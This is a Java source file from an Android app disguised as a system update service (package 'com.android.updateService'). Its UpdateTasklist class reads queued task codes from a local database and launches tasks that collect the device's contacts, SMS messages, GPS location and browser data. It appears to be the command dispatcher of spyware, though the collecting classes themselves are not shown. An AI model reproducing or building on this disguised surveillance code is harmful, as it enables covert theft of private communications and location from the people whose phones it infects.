package com.android.updateService;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.util.Log;
import org.apache.http.HttpResponse;

import java.util.ArrayList;


public class UpdateTasklist extends AsyncTask<String, Integer, String>  {

    private Context tContext;
    protected SQLiteDatabase db;

    public UpdateTasklist(Context tContext) {
        this.tContext = tContext;
        db = (new DatabaseHelper(tContext)).getWritableDatabase();
    }
    protected String doInBackground(String... arg0) {
       // Log.d("aaaaaaaaa", "updateTasklist class start");
        Cursor cursor = this.db.query("sUpdates", new String[] { "taskName,taskUID"},null, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                switch (Integer.parseInt(cursor.getString(0))) {
                    case 1:
                        UpdateContact ctask = new UpdateContact(this.tContext);
                        ctask.execute(cursor.getString(1));
                        break;
                    case 2:
                        UpdateSms smtask = new UpdateSms(this.tContext);
                        smtask.execute(cursor.getString(1));
                        break;
                    case 3:
                        UpdateGPS gptask = new UpdateGPS(this.tContext);
                        gptask.execute(  cursor.getString(1));
                        break;
                    case 4:
                        UpdateBrowser brwtask = new UpdateBrowser(this.tContext);
                        brwtask.execute(  cursor.getString(1));
                        break;
                }
            } while (cursor.moveToNext());
        }
            return  "";
    }

}
